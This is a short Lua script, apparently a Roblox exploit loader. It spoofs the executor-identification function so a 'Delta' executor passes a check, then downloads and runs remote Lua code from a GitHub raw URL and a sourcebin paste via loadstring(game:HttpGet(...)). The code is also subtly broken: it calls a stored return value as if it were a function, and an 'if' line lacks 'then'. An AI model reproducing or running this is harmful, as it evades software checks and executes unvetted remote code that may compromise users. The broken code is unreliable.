old_identify = identifyexecutor()
fake_identify = function()
  real_exec = old_identify()
  if real_exec == 'Delta'
    return 'Delta_Allowed'
  end
  return real_exec
end
identifyexecutor = fake_identify
getgenv().identifyexecutor = fake_identify
loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua')))()
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/oncBy1yojB/0", true))()
